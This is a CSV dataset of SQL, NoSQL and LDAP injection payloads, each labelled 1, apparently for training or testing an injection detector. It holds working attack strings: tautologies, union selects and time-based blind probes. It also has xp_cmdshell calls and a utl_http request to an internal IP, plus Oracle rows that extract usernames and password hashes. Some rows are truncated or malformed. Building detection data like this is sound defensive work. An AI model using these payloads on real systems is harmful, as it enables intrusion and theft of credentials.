payload,label
x' AND members.email IS NULL; --,1
or 1=1--,1
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
%20'sleep%2050',1
1)) or pg_sleep(__TIME__)--,1
/**/or/**/1/**/=/**/1,1
union all select @@version--,1
",@variable",1
(sqlattempt2),1
or (EXISTS),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
%20$(sleep%2050),1
"1 or benchmark(10000000,MD5(1))#",1
%20or%20''=',1
||UTL_HTTP.REQUEST,1
or pg_sleep(__TIME__)--,1
hi' or 'x'='x';,1
) or sleep(__TIME__)=,1
or 'whatever' in ('whatever'),1
; begin declare @var varchar(8000) set @var=' ...,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec(@s),1
) or pg_sleep(__TIME__)--,1
union select,1
or sleep(__TIME__)#,1
select * from information_schema.tables--,1
a' or 1=1--,1
a' or 'a' = 'a,1
declare @s varchar(22) select @s =,1
or 2 between 1 and 3,1
or a=a--,1
or '1'='1,1
|,1
or sleep(__TIME__)=',1
or 1 --',1
"or 0=0 #""",1
having,1
a',1
 or isNULL(1/0) /*,1
declare @s varchar (8000) select @s = 0x73656c ...,1
 or 1=1 --,1
char%4039%41%2b%40SELECT,1
order by,1
bfilename,1
having 1=1--,1
") or benchmark(10000000,MD5(1))#",1
or username like char(37);,1
;waitfor delay '0:0:__TIME__'--,1
"or 1=1--""",1
x' AND userid IS NULL; --,1
*/*,1
or 'text' > 't',1
(select top 1,1
"or benchmark(10000000,MD5(1))#",1
);waitfor delay '0:0:__TIME__'--,1
-- &password=,1
group by userid having 1=1--,1
or ''=',1
; exec master..xp_cmdshell,1
%20or%20x=x,1
select,1
a' or 3=3--,1
")) or sleep(__TIME__)=""""""",1
0x730065006c0065006300740020004000400076006500 ...,1
hi' or 1=1 --,1
) or pg_sleep(__TIME__)--,1
%20or%20'x'='x,1
or 'something' = 'some'+'thing',1
exec sp,1
29 %,1
(,1
 or 1=1 --,1
1 or pg_sleep(__TIME__)--,1
0 or 1=1,1
) or (a=a,1
uni/**/on sel/**/ect,1
replace,1
%27%20or%201=1,1
)) or pg_sleep(__TIME__)--,1
%7C,1
x' AND 1=(SELECT COUNT(*) FROM tabname); --,1
&apos;%20OR,1
; or '1'='1',1
declare @q nvarchar (200) select @q = 0x770061 ...,1
1 or 1=1,1
; exec ('sel' + 'ect us' + 'er'),1
23 OR 1=1,1
/,1
anything' OR 'x'='x,1
declare @q nvarchar (4000) select @q =,1
or 0=0 --,1
desc,1
||'6,1
),1
1)) or sleep(__TIME__)#,1
or 0=0 #,1
select name from syscolumns where id = (sele ...,1
hi or a=a,1
*(|(mail=*)),1
password:*/=1--,1
distinct,1
);waitfor delay '0:0:__TIME__'--,1
to_timestamp_tz,1
") or benchmark(10000000,MD5(1))#""",1
%2A%28%7C%28mail%3D%2A%29%29,1
or 1=1 /*,1
)) or sleep(__TIME__)=',1
"or 1=1 or """"=",1
or 1 in (select @@version)--,1
union select * from users where login = char ...,1
x' or 1=1 or 'x'='y,1
 or 3=3 --,1
@variable,1
or '1'='1'--,1
"a"" or 1=1--",1
//*,1
%2A%7C,1
""" or 0=0 --",1
")) or pg_sleep(__TIME__)--""",1
or a = a,1
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
 or 1=1,1
 or 1=1 --,1
x' OR full_name LIKE '%Bob%,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
%20or%20''=',1
%20or%20'x'='x,1
)%20or%20('x'='x,1
 or 0=0 --,1
 or 0=0 #,1
"or 0=0 #""",1
 or 1=1--,1
 or '1'='1'--,1
 or 1 --',1
or 1=1--,1
 or 1=1 or ''=',1
"or 1=1 or """"=",1
 or a=a--,1
or a=a,1
) or ('a'='a,1
hi' or 'x'='x';,1
or,1
procedure,1
 or username like '%,1
 or uname like '%,1
 or userid like '%,1
 or uid like '%,1
 or user like '%,1
; exec master..xp_cmdshell,1
; exec xp_regread,1
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
 UNION SELECT,1
 UNION ALL SELECT,1
 or (EXISTS),1
 (select top 1,1
||UTL_HTTP.REQUEST,1
1;SELECT%20*,1
"<>""'%;)(&+",1
%20or%201=1,1
sqlattempt1,1
 or ''=',1
 or 3=3,1
 or 3=3 --,1
sleep(5)#,1
1 or sleep(5)#,1
" or sleep(5)#
' or sleep(5)#
 or sleep(5)=""",1
 or sleep(5)=',1
1) or sleep(5)#,1
) or sleep(5)=,1
) or sleep(5)=',1
1)) or sleep(5)#,1
)) or sleep(5)=,1
)) or sleep(5)=',1
;waitfor delay '0:0:5'--,1
);waitfor delay '0:0:5'--,1
;waitfor delay '0:0:5'--,1
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--",1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
"benchmark(10000000,MD5(1))#",1
"1 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#",1
"1)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#",1
pg_sleep(5)--,1
1 or pg_sleep(5)--,1
""" or pg_sleep(5)--",1
 or pg_sleep(5)--,1
1) or pg_sleep(5)--,1
""") or pg_sleep(5)--",1
) or pg_sleep(5)--,1
1)) or pg_sleep(5)--,1
""")) or pg_sleep(5)--",1
)) or pg_sleep(5)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,1
SLEEP(5)#,1
SLEEP(5)--,1
"SLEEP(5)=""",1
SLEEP(5)=',1
or SLEEP(5),1
or SLEEP(5)#,1
or SLEEP(5)--,1
"or SLEEP(5)=""",1
or SLEEP(5)=',1
waitfor delay '00:00:05',1
waitfor delay '00:00:05'--,1
waitfor delay '00:00:05'#,1
"benchmark(50000000,MD5(1))",1
"benchmark(50000000,MD5(1))--",1
"benchmark(50000000,MD5(1))#",1
"or benchmark(50000000,MD5(1))",1
"or benchmark(50000000,MD5(1))--",1
"or benchmark(50000000,MD5(1))#",1
pg_SLEEP(5),1
pg_SLEEP(5)--,1
pg_SLEEP(5)#,1
or pg_SLEEP(5),1
or pg_SLEEP(5)--,1
or pg_SLEEP(5)#,1
"\""",1
AnD SLEEP(5),1
AnD SLEEP(5)--,1
AnD SLEEP(5)#,1
&&SLEEP(5),1
&&SLEEP(5)--,1
&&SLEEP(5)#,1
 AnD SLEEP(5) ANd '1,1
&&SLEEP(5)&&'1,1
ORDER BY SLEEP(5),1
ORDER BY SLEEP(5)--,1
ORDER BY SLEEP(5)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,1
RANDOMBLOB(500000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
<username>'--,1
RANDOMBLOB(1000000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
; --,1
; --,1
); --,1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
 grant connect to name; grant resource to name; --,1
 or 1=1 --,1
 union (select @@version) --,1
" union (select NULL, (select @@version)) --",1
" union (select NULL, NULL, (select @@version)) --",1
" union (select NULL, NULL, NULL,  (select @@version)) --",1
" union (select NULL, NULL, NULL, NULL,  (select @@version)) --",1
" union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",1
"; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",1
"; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",1
; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1
; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1
; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1
; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1
1'1,1
1 exec sp_ (or exec xp_),1
1 and 1=1,1
1' and 1=(select count(*) from tablenames); --,1
1 or 1=1,1
1' or '1'='1,1
1or1=1,1
1'or'1'='1,1
fake@ema'or'il.nl'='il.nl,1
1 and user_name() = 'dbo',1
\'; desc users; --,1
1\'1,1
1' and non_existant_table = '1,1
 or username is not NULL or username = ',1
"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1
1 uni/**/on select all from where,1
"true, $where: '1 == 1'",1
", $where: '1 == 1'",1
$where: '1 == 1',1
", $where: '1 == 1'",1
"1, $where: '1 == 1'",1
{ $ne: 1 },1
", $or: [ {}, { 'a':'a",1
" } ], $comment:'successful MongoDB injection'",1
db.injection.insert({success:1});,1
"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",1
|| 1==1,1
 && this.password.match(/.*/)//+%00,1
 && this.passwordzz.match(/.*/)//+%00,1
%20%26%26%20this.password.match(/.*/)//+%00,1
%20%26%26%20this.passwordzz.match(/.*/)//+%00,1
{$gt: ''},1
[$ne]=1,1
;sleep(5000);,1
;sleep(5000);',1
;sleep(5000);+',1
;it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
 or 1=1,1
 or '1'='1,1
||utl_http.request('httP://192.168.1.1/')||',1
" || myappadmin.adduser('admin', 'newpass') || '",1
 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1
 AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1
" AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1
"<>""'%;)(&+",1
|,1
!,1
?,1
/,1
//,1
//*,1
,1
 --,1
(,1
),1
*|,1
*/*,1
&,1
0 or 1=1,1
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
